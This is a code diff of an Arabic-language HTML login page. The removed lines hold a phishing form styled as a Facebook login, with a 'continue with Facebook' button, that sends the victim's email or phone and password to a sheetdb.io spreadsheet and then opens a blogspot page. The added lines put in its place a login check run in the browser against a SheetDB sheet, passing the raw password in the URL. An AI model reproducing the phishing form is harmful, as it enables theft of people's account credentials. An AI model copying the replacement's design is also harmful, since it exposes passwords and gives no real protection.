@@ -1,92 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    background-color: #f2f2f2;
+    margin: 0;
+    padding: 0;
+  }
+  form {
+    max-width: 300px;
+    margin: 50px auto;
+    padding: 20px;
+    background-color: #fff;
+    border-radius: 5px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+  }
+  input[type="text"],
+  input[type="password"] {
+    width: calc(100% - 20px);
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+  }
+  button {
+    padding: 10px 20px;
+    font-size: 16px;
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    cursor: pointer;
+    border-radius: 5px;
+  }
+  .error {
+    background-color: #ffcccc; /* خلفية حمراء للأخطاء */
+  }
+  .success {
+    background-color: #ffffcc; /* خلفية صفراء للنجاح */
+  }
+</style>
+</head>
+<body>
 
-
-<form action="https://sheetdb.io/api/v1/irgjdr5t2fpuh" class="modal-content animate" id="sheetdb-form" method="post">
-    <div class="imgcontainer">
-      <span class="close" onclick="document.getElementById('id01').style.display='none'" title="Close Modal">×</span>
-     <img height="70" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg86D1PxGZOCSl3_DPRTfl4Q14te8WpSUIMeBUWWeNIhiZwkuZL4_XL5suY1Lv7Y4-ewU-3W823kDuXSwxOojK2FKwQ0r7ZLQKe2232kf8S_bkRCrz1-aqd28Gc1QJn7bx-vI3GZAXyJPGNI1-mJouxe2xKGbj0tK_uUcY_BnAKNWPwJDNxQjOKm4aW/s350/d2529dbef8ed.png" weidht="35" />
-      
-      
-      
-      
-<button style="background-color:#4267B2; color:#FFFFF;border-color:#445483;"> تواصل مع الفيسبوك</button>
-      <h3>
-
-        او</h3>
-      
-
-<hr class="solid">
-
-     
-      
-       
-    
-
-     
-   
-      
-
-
-
-    
-
-</div>
-
-    <div class="container">
-
-      <label for="email"></label>
-      <input name="email" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني " required="" type="text" />
-      
-
-      <label for="psw"></label>
-      <input name="psw" placeholder="كلمة السر" required="" type="password" /><div>
-      
-<h5 style="color:#4267B2">هل نسيت كلمه السر ؟</h5>
-        </div>
-      <button class="button button4" type="submit" style=" color:#FFFAFA" size="+15">تسجيل الدخول</button>
-      
-    </div>
-
-   
-    <center>   
-    
-     <div>
-      
-    
-     
-   
-     
-      <a style="color:#4267B2"></a><a style="color:#4267B2"></a>
-       
-       
-       
-       
-    </div>    
-       </center>
-       
-      
-       
-
-
-    
-      
-    
-    
-  </form>
-
+<form id="loginForm">
+  <h2 id="loginMessage">تسجيل الدخول</h2>
+  <input type="text" id="email" name="email" placeholder="البريد الإلكتروني">
+  <input type="password" id="password" name="password" placeholder="كلمة المرور">
+  <button type="submit">تسجيل الدخول</button>
+</form>
 
 <script>
-            var form = document.getElementById('sheetdb-form');
-        form.addEventListener("submit", e => {
-          e.preventDefault();
-          fetch(form.action, {
-              method : "POST",
-              body: new FormData(document.getElementById("sheetdb-form")),
-          }).then(
-              response => response.json()
-          ).then((html) => {
-            // you can put any JS code here
-            window.open('https://please-wite.blogspot.com/?m=1', '_blank');
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  event.preventDefault();
+  
+  var email = document.getElementById("email").value.trim();
+  var password = document.getElementById("password").value.trim();
+  
+  // استبدال your_sheet_id برقم هوية جدول SheetDB الخاص بك
+  var url = "https://sheetdb.io/api/v1/i4mf1cmxz86h2/search?email=" + email + "&psw=" + password;
+  
+  fetch(url)
+  .then(response => response.json())
+  .then(data => {
+    if (data.length > 0) {
+      // تغيير خلفية الرسالة إلى اللون الأصفر للنجاح
+      document.getElementById("loginMessage").classList.remove("error");
+      document.getElementById("loginMessage").classList.add("success");
+      document.getElementById("loginMessage").innerText = "تم التحقق";
+      // تحويل المستخدم إلى صفحة أخرى بعد تسجيل الدخول بنجاح
+      window.location.href = "c.html"; // استبدل بعنوان الصفحة الجديدة
+    } else {
+      // تغيير خلفية الرسالة إلى اللون الأحمر للخطأ
+      document.getElementById("loginMessage").classList.remove("success");
+      document.getElementById("loginMessage").classList.add("error");
+      document.getElementById("loginMessage").innerText = "كلمة المرور خطأ";
+    }
+  })
+  .catch(error => console.error('Error:', error));
+});
+</script>
 
-          });
-        });
-	</script>
+</body>
+</html>
